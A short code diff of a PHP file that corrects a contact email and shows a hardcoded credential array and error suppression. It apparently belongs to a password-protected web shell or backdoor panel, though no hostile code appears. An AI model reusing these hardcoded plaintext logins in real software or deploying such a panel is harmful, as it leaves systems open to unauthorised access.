@@ -6,7 +6,7 @@ session_start();
 @ini_set('display_errors',0);
 
 $TD_VER   = 'v3.0';
-$TD_EMAIL = 'nulll7ganteng@gmail.com';
+$TD_EMAIL = 'null7ganteng@gmail.com';
 $TD_CREDS = array(
     'admin' => 'ularsawah',
     'null7' => 'null7pass',
